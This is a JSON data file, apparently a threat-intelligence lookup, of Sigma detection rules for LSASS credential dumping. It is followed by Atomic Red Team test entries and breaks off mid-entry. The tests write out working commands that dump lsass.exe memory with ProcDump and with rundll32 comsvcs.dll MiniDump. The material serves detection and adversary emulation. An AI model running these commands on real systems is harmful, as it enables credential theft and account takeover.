                            "raw": "author: \"Ensar \\u015Eamil, @sblmsrsn, @oscd_initiative\"\ndate: 2020/10/06\ndescription: Detects usage of Time Travel Debugging Utility. Adversaries can execute\n  malicious processes and dump processes, such as lsass.exe, via tttracer.exe.\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|endswith:\n    - \\ttdrecord.dll\n    - \\ttdwriter.dll\n    - \\ttdloader.dll\nfalsepositives:\n- Legitimate usage by software developers/testers\nid: e76c8240-d68f-4773-8880-5c6f63595aaf\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Tttracer/\n- https://twitter.com/mattifestation/status/1196390321783025666\n- https://twitter.com/oulusoyum/status/1191329746069655553\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.credential_access\n- attack.t1218\n- attack.t1003.001\ntitle: Time Travel Debugging Utility Usage - Image\n",
                            "sigma:id": "e76c8240-d68f-4773-8880-5c6f63595aaf",
                            "title": "Time Travel Debugging Utility Usage - Image",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "23ceaf5c-b6f1-4a32-8559-f2ff734be516",
                        "lookup_data": {
                            "description": "Detects process dump via legitimate sqldumper.exe binary",
                            "raw": "author: Kirill Kiryanov, oscd.community\ndate: 2020/10/08\ndescription: Detects process dump via legitimate sqldumper.exe binary\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - '0x0110'\n    - 0x01100:40\n    Image|endswith: \\sqldumper.exe\nfalsepositives:\n- Legitimate MSSQL Server actions\nid: 23ceaf5c-b6f1-4a32-8559-f2ff734be516\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/countuponsec/status/910977826853068800\n- https://twitter.com/countuponsec/status/910969424215232518\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Dumping Process via Sqldumper.exe\n",
                            "sigma:id": "23ceaf5c-b6f1-4a32-8559-f2ff734be516",
                            "title": "Dumping Process via Sqldumper.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "93d94efc-d7ad-4161-ad7d-1638c4f908d8",
                        "lookup_data": {
                            "description": "Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/02/04\ndescription: Detects the use of Dumpert process dumper, which dumps the lsass.exe\n  process memory\ndetection:\n  condition: selection\n  selection:\n    TargetFilename: C:\\Windows\\Temp\\dumpert.dmp\nfalsepositives:\n- Very unlikely\nid: 93d94efc-d7ad-4161-ad7d-1638c4f908d8\nlevel: critical\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/outflanknl/Dumpert\n- https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/\nrelated:\n- id: 2704ab9e-afe2-4854-a3b1-0c0706d03578\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Dumpert Process Dumper Default File\n",
                            "sigma:id": "93d94efc-d7ad-4161-ad7d-1638c4f908d8",
                            "title": "Dumpert Process Dumper Default File",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9433ff9c-5d3f-4269-99f8-95fc826ea489",
                        "lookup_data": {
                            "description": "Detects suspicious file creation patterns found in logs when CrackMapExec is used",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/12\ndescription: Detects suspicious file creation patterns found in logs when CrackMapExec\n  is used\ndetection:\n  condition: 1 of selection*\n  selection_lsass_dump1:\n    Image: C:\\WINDOWS\\system32\\rundll32.exe\n    TargetFilename|endswith:\n    - .rtf\n    - .otf\n    - .odt\n    - .txt\n    - .doc\n    - .pdf\n    - .dll\n    - .docx\n    - .wpd\n    - .icns\n    - .db\n    - .ini\n    - .tex\n    - .sys\n    - .csv\n    - .fon\n    - .tar\n    - .ttf\n    - .xml\n    - .cfg\n    - .cpl\n    - .jpg\n    - .drv\n    - .cur\n    - .tmp\n    TargetFilename|startswith: C:\\Windows\\Temp\\\n    User|contains:\n    - AUTHORI\n    - AUTORI\n  selection_procdump:\n    TargetFilename: C:\\Windows\\Temp\\procdump.exe\n    User|contains:\n    - AUTHORI\n    - AUTORI\nfalsepositives:\n- Unknown\nid: 9433ff9c-5d3f-4269-99f8-95fc826ea489\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/05/27\nreferences:\n- https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials/dump-lsass\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: CrackMapExec File Creation Patterns\n",
                            "sigma:id": "9433ff9c-5d3f-4269-99f8-95fc826ea489",
                            "title": "CrackMapExec File Creation Patterns",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "32d0d3e2-e58d-4d41-926b-18b520b2b32d",
                        "lookup_data": {
                            "description": "Detects processes requesting access to LSASS memory via suspicious access masks. This is typical for credentials dumping tools",
                            "raw": "author: Florian Roth, Roberto Rodriguez, Dimitrios Slamaris, Mark Russinovich, Thomas\n  Patzke, Teymur Kheirkhabarov, Sherif Eldeeb, James Dickenson, Aleksey Potapov, oscd.community\ndate: 2017/02/16\ndescription: Detects processes requesting access to LSASS memory via suspicious access\n  masks. This is typical for credentials dumping tools\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_defender:\n    SourceImage|endswith: \\MsMpEng.exe\n    SourceImage|startswith:\n    - C:\\ProgramData\\Microsoft\\Windows Defender\\\n    - C:\\Program Files\\Windows Defender\\\n  filter_defender_calltrace:\n    CallTrace|contains:\n    - '|c:\\program files\\windows defender\\mprtp.dll'\n    - '|c:\\program files\\windows defender\\MpClient.dll'\n  filter_defender_updates:\n    CallTrace|contains|all:\n    - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n    - '}\\mpengine.dll+'\n    GrantedAccess: '0x1418'\n    SourceImage: C:\\Windows\\System32\\svchost.exe\n  filter_dropbox:\n    GrantedAccess:\n    - '0x410'\n    - '0x1410'\n    SourceImage|contains:\n    - :\\Windows\\Temp\\\n    - \\AppData\\Local\\Temp\\\n    SourceImage|endswith: .tmp\\DropboxUpdate.exe\n  filter_edge:\n    SourceImage|endswith: \\Installer\\setup.exe\n    SourceImage|startswith: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\\n  filter_exact:\n    SourceImage:\n    - C:\\WINDOWS\\system32\\taskmgr.exe\n    - C:\\Windows\\System32\\perfmon.exe\n  filter_explorer:\n    GrantedAccess: '0x401'\n    SourceImage|endswith: \\explorer.exe\n  filter_games:\n    SourceImage|contains: \\SteamLibrary\\steamapps\\\n  filter_gaming_services:\n    GrantedAccess:\n    - '0x1410'\n    - '0x410'\n    SourceImage|endswith: \\GamingServices.exe\n    SourceImage|startswith: C:\\Program Files\\WindowsApps\\\n  filter_generic:\n    GrantedAccess:\n    - '0x1410'\n    - '0x410'\n    SourceImage|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n  filter_handle:\n    GrantedAccess: '0x40'\n    SourceImage|endswith:\n    - \\handle.exe\n    - \\handle64.exe\n  filter_malwarebytes:\n    GrantedAccess: '0x1410'\n    SourceImage: C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe\n  filter_mrt:\n    GrantedAccess:\n    - '0x1410'\n    - '0x1418'\n    SourceImage: C:\\Windows\\system32\\MRT.exe\n  filter_msbuild:\n    GrantedAccess: '0x1F3FFF'\n    SourceImage|endswith: \\MSBuild\\Current\\Bin\\MSBuild.exe\n    SourceImage|startswith: C:\\Program Files\\Microsoft Visual Studio\\\n  filter_nextron:\n    GrantedAccess:\n    - '0x40'\n    - '0x1010'\n    SourceImage|endswith:\n    - \\thor.exe\n    - \\thor64.exe\n    - \\aurora-agent.exe\n    - \\aurora-agent-64.exe\n  filter_specific_granted_access_1:\n    GrantedAccess:\n    - '0x1410'\n    - '0x410'\n    - '0x40'\n    SourceImage|endswith:\n    - \\PROCEXP64.EXE\n    - \\PROCEXP.EXE\n    - C:\\WINDOWS\\system32\\taskhostw.exe\n    - \\MBAMInstallerService.exe\n  filter_specific_granted_access_2:\n    GrantedAccess:\n    - '0x1410'\n    - '0x410'\n    - '0x1f1fff'\n    - '0x1f3fff'\n    SourceImage:\n    - C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n    - C:\\Windows\\syswow64\\MsiExec.exe\n    - C:\\Windows\\System32\\msiexec.exe\n  filter_specific_granted_access_3:\n    GrantedAccess: '0x1000000'\n    SourceImage:\n    - C:\\Windows\\system32\\wininit.exe\n    - C:\\Windows\\System32\\lsass.exe\n  filter_svchost:\n    GrantedAccess:\n    - '0x100000'\n    - '0x1410'\n    SourceImage: C:\\WINDOWS\\system32\\svchost.exe\n  filter_vmwaretools:\n    SourceImage|endswith: \\vmtoolsd.exe\n    SourceImage|startswith: C:\\ProgramData\\VMware\\VMware Tools\\\n  filter_webex:\n    GrantedAccess: '0x401'\n    SourceImage|endswith: \\AppData\\Local\\WebEx\\WebexHost.exe\n  selection:\n    GrantedAccess|startswith:\n    - '0x40'\n    - '0x100000'\n    - '0x1410'\n    - '0x1438'\n    - '0x143a'\n    - '0x1418'\n    - '0x1f0fff'\n    - '0x1f1fff'\n    - '0x1f2fff'\n    - '0x1f3fff'\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Legitimate software accessing LSASS process for legitimate reason; please add more\n  filters\nfields:\n- ComputerName\n- User\n- SourceImage\nid: 32d0d3e2-e58d-4d41-926b-18b520b2b32d\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2023/01/25\nreferences:\n- https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n- https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\n- car.2019-04-004\ntitle: Credential Dumping Tools Accessing LSASS Memory\n",
                            "sigma:id": "32d0d3e2-e58d-4d41-926b-18b520b2b32d",
                            "title": "Credential Dumping Tools Accessing LSASS Memory",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b1876533-4ed5-4a83-90f3-b8645840a413",
                        "lookup_data": {
                            "description": "Detects the execution of the hacktool SafetyKatz via PE information and default Image name",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/20\ndescription: Detects the execution of the hacktool SafetyKatz via PE information and\n  default Image name\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\SafetyKatz.exe\n  - OriginalFileName: SafetyKatz.exe\n  - Description: SafetyKatz\nfalsepositives:\n- Unlikely\nid: b1876533-4ed5-4a83-90f3-b8645840a413\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/GhostPack/SafetyKatz\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: SafetyKatz Hack Tool\n",
                            "sigma:id": "b1876533-4ed5-4a83-90f3-b8645840a413",
                            "title": "SafetyKatz Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "129966c9-de17-4334-a123-8b58172e664d",
                        "lookup_data": {
                            "description": "Detects when a user bypasses Defender by renaming a tool to dump64.exe and placing it in a Visual Studio folder",
                            "raw": "author: Austin Songer @austinsonger, Florian Roth\ndate: 2021/11/26\ndescription: Detects when a user bypasses Defender by renaming a tool to dump64.exe\n  and placing it in a Visual Studio folder\ndetection:\n  condition: ( selection and not filter ) or ( selection and procdump_flags )\n  filter:\n    Image|contains: \\Installer\\Feedback\\dump64.exe\n  procdump_flags:\n    CommandLine|contains:\n    - ' -ma '\n    - accpeteula\n  selection:\n    Image|endswith: \\dump64.exe\nfalsepositives:\n- Dump64.exe in other folders than the excluded one\nid: 129966c9-de17-4334-a123-8b58172e664d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/mrd0x/status/1460597833917251595\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Suspicious Dump64.exe Execution\n",
                            "sigma:id": "129966c9-de17-4334-a123-8b58172e664d",
                            "title": "Suspicious Dump64.exe Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8cde342c-ba48-4b74-b615-172c330f2e93",
                        "lookup_data": {
                            "description": "Detects rundll32 loading a renamed comsvcs.dll to dump process memory",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/14\ndescription: Detects rundll32 loading a renamed comsvcs.dll to dump process memory\ndetection:\n  condition: selection and not filter\n  filter:\n    ImageLoaded|endswith: \\comsvcs.dll\n  selection:\n    Hashes|contains:\n    - IMPHASH=eed93054cb555f3de70eaa9787f32ebb\n    - IMPHASH=5e0dbdec1fce52daae251a110b4f309d\n    - IMPHASH=eadbccbb324829acb5f2bbe87e5549a8\n    - IMPHASH=407ca0f7b523319d758a40d7c0193699\n    - IMPHASH=281d618f4e6271e527e6386ea6f748de\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Unlikely\nid: 8cde342c-ba48-4b74-b615-172c330f2e93\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nreferences:\n- https://twitter.com/sbousseaden/status/1555200155351228419\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.defense_evasion\n- attack.t1003.001\ntitle: Rundll32 Loading Renamed Comsvcs DLL\n",
                            "sigma:id": "8cde342c-ba48-4b74-b615-172c330f2e93",
                            "title": "Rundll32 Loading Renamed Comsvcs DLL",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "84c174ab-d3ef-481f-9c86-a50d0b8e3edb",
                        "lookup_data": {
                            "description": "Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/04/23\ndescription: Detects a Get-Process command on lsass process, which is in almost all\n  cases a sign of malicious activity\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: Get-Process lsass\nfalsepositives:\n- Legitimate certificate exports invoked by administrators or users (depends on processes\n  in the environment - filter if unusable)\nid: 84c174ab-d3ef-481f-9c86-a50d0b8e3edb\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/PythonResponder/status/1385064506049630211\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: PowerShell Get-Process LSASS in ScriptBlock\n",
                            "sigma:id": "84c174ab-d3ef-481f-9c86-a50d0b8e3edb",
                            "title": "PowerShell Get-Process LSASS in ScriptBlock",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7aa7009a-28b9-4344-8c1f-159489a390df",
                        "lookup_data": {
                            "description": "Detects the use of Windows Credential Editor (WCE)",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/31\ndescription: Detects the use of Windows Credential Editor (WCE)\ndetection:\n  condition: ( selection1 or selection2 ) and not filter\n  filter:\n    Image|endswith: \\clussvc.exe\n  selection1:\n  - Imphash:\n    - a53a02b997935fd8eedcb5f7abab9b9f\n    - e96a73c7bf33a464c510ede582318bf2\n  - Hashes|contains:\n    - IMPHASH=a53a02b997935fd8eedcb5f7abab9b9f\n    - IMPHASH=e96a73c7bf33a464c510ede582318bf2\n  selection2:\n    CommandLine|endswith: .exe -S\n    ParentImage|endswith: \\services.exe\nfalsepositives:\n- Another service that uses a single -s command line switch\nid: 7aa7009a-28b9-4344-8c1f-159489a390df\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/04\nreferences:\n- https://www.ampliasecurity.com/research/windows-credentials-editor/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0005\ntitle: Windows Credential Editor\n",
                            "sigma:id": "7aa7009a-28b9-4344-8c1f-159489a390df",
                            "title": "Windows Credential Editor",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4be8b654-0c01-4c9d-a10c-6b28467fc651",
                        "lookup_data": {
                            "description": "Detects a possible process memory dump that uses the white-listed filename like TrolleyExpress.exe as a way to dump the lsass process memory without Microsoft Defender interference",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/10\ndescription: Detects a possible process memory dump that uses the white-listed filename\n  like TrolleyExpress.exe as a way to dump the lsass process memory without Microsoft\n  Defender interference\ndetection:\n  condition: selection\n  selection:\n    GrantedAccess|endswith:\n    - '10'\n    - '30'\n    - '50'\n    - '70'\n    - '90'\n    - B0\n    - D0\n    - F0\n    - '18'\n    - '38'\n    - '58'\n    - '78'\n    - '98'\n    - B8\n    - D8\n    - F8\n    - 1A\n    - 3A\n    - 5A\n    - 7A\n    - 9A\n    - BA\n    - DA\n    - FA\n    - '0x14C2'\n    - FF\n    SourceImage|endswith:\n    - \\TrolleyExpress.exe\n    - \\ProcessDump.exe\n    - \\dump64.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unlikely, since these tools shouldn't access lsass.exe at all\nid: 4be8b654-0c01-4c9d-a10c-6b28467fc651\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nreferences:\n- https://twitter.com/_xpn_/status/1491557187168178176\n- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz\n- https://twitter.com/mrd0x/status/1460597833917251595\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\ntitle: LSASS Access from White-Listed Processes\n",
                            "sigma:id": "4be8b654-0c01-4c9d-a10c-6b28467fc651",
                            "title": "LSASS Access from White-Listed Processes",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7186e989-4ed7-4f4e-a656-4674b9e3e48b",
                        "lookup_data": {
                            "description": "Detects LSASS process access by pypykatz for credential dumping.",
                            "raw": "author: Bhabesh Raj\ndate: 2021/08/03\ndescription: Detects LSASS process access by pypykatz for credential dumping.\ndetection:\n  condition: selection\n  selection:\n    CallTrace|contains|all:\n    - C:\\Windows\\SYSTEM32\\ntdll.dll+\n    - C:\\Windows\\System32\\KERNELBASE.dll+\n    - libffi-7.dll\n    - _ctypes.pyd+\n    - python3*.dll+\n    GrantedAccess: '0x1FFFFF'\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: 7186e989-4ed7-4f4e-a656-4674b9e3e48b\nlevel: critical\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/skelsec/pypykatz\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Credential Dumping by Pypykatz\n",
                            "sigma:id": "7186e989-4ed7-4f4e-a656-4674b9e3e48b",
                            "title": "Credential Dumping by Pypykatz",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
                        "lookup_data": {
                            "description": "Detects well-known credential dumping tools execution via service execution events",
                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: f0d1feba-4344-4ca9-8121-a6c97bd6df52\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - Security\n",
                            "sigma:id": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
                            "title": "Credential Dumping Tools Service Execution - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "09e6d5c0-05b8-4ff8-9eeb-043046ec774c",
                        "lookup_data": {
                            "description": "Detects process memory dump via comsvcs.dll and rundll32",
                            "raw": "author: Modexp (idea)\ndate: 2019/09/02\ndescription: Detects process memory dump via comsvcs.dll and rundll32\ndetection:\n  condition: (rundll_image or rundll_ofn) and selection\n  rundll_image:\n    Image|endswith: \\rundll32.exe\n  rundll_ofn:\n    OriginalFileName: RUNDLL32.EXE\n  selection:\n    CommandLine|contains|all:\n    - comsvcs\n    - MiniDump\n    - full\nfalsepositives:\n- unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/09/05\nreferences:\n- https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\n- https://twitter.com/SBousseaden/status/1167417096374050817\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003\ntitle: Process Dump via Comsvcs DLL\n",
                            "sigma:id": "09e6d5c0-05b8-4ff8-9eeb-043046ec774c",
                            "title": "Process Dump via Comsvcs DLL",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "36d88494-1d43-4dc0-b3fa-35c8fea0ca9d",
                        "lookup_data": {
                            "description": "Detects the use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/22\ndescription: Detects the use of CreateMiniDump hack tool used to dump the LSASS process\n  memory for credential extraction on the attacker's machine\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|endswith: \\CreateMiniDump.exe\n  selection2:\n  - Imphash: 4a07f944a83e8a7c2525efa35dd30e2f\n  - Hashes|contains: IMPHASH=4a07f944a83e8a7c2525efa35dd30e2f\nfalsepositives:\n- Unknown\nid: 36d88494-1d43-4dc0-b3fa-35c8fea0ca9d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: CreateMiniDump Hacktool\n",
                            "sigma:id": "36d88494-1d43-4dc0-b3fa-35c8fea0ca9d",
                            "title": "CreateMiniDump Hacktool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0b4ae027-2a2d-4b93-8c7e-962caaba5b2a",
                        "lookup_data": {
                            "description": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.",
                            "raw": "author: \"Ensar \\u015Eamil, @sblmsrsn, @oscd_initiative\"\ndate: 2020/10/06\ndescription: Detects usage of Time Travel Debugging Utility. Adversaries can execute\n  malicious processes and dump processes, such as lsass.exe, via tttracer.exe.\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\tttracer.exe\nfalsepositives:\n- Legitimate usage by software developers/testers\nid: 0b4ae027-2a2d-4b93-8c7e-962caaba5b2a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Tttracer/\n- https://twitter.com/mattifestation/status/1196390321783025666\n- https://twitter.com/oulusoyum/status/1191329746069655553\nrelated:\n- id: e76c8240-d68f-4773-8880-5c6f63595aaf\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.credential_access\n- attack.t1218\n- attack.t1003.001\ntitle: Time Travel Debugging Utility Usage\n",
                            "sigma:id": "0b4ae027-2a2d-4b93-8c7e-962caaba5b2a",
                            "title": "Time Travel Debugging Utility Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                        "lookup_data": {
                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1674763285",
                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fb656378-f909-47c1-8747-278bf09f4f4f",
                        "lookup_data": {
                            "description": "Detects remote thread creation by PowerShell processes into \"lsass.exe\"",
                            "raw": "author: oscd.community, Natalia Shornikova\ndate: 2020/10/06\ndescription: Detects remote thread creation by PowerShell processes into \"lsass.exe\"\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: fb656378-f909-47c1-8747-278bf09f4f4f\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/12/18\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nrelated:\n- id: 3f07b9d1-2082-4c56-9277-613a621983cc\n  type: obsoletes\n- id: 0f920ebe-7aea-4c54-b202-9aa0c609cfe5\n  type: similar\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Potential Credential Dumping Attempt Via PowerShell Remote Thread\n",
                            "sigma:id": "fb656378-f909-47c1-8747-278bf09f4f4f",
                            "title": "Potential Credential Dumping Attempt Via PowerShell Remote Thread",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1003.001",
                "display_name": "OS Credential Dumping: LSASS Memory",
                "atomic_tests": [
                    {
                        "name": "Dump LSASS.exe Memory using ProcDump",
                        "auto_generated_guid": "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "output_file": {
                                "description": "Path where resulting dump should be placed",
                                "type": "path",
                                "default": "C:\\Windows\\Temp\\lsass_dump.dmp"
                            },
                            "procdump_exe": {
                                "description": "Path of Procdump executable",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
                                "prereq_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{procdump_exe}\" -accepteula -ma lsass.exe #{output_file}\n",
                            "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe Memory using comsvcs.dll",
                        "auto_generated_guid": "2536dee2-12fb-459a-8c37-971844fa73be",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n",
                            "cleanup_command": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
                        "auto_generated_guid": "7ae7102c-a099-45c8-b985-4c7a2d05790d",
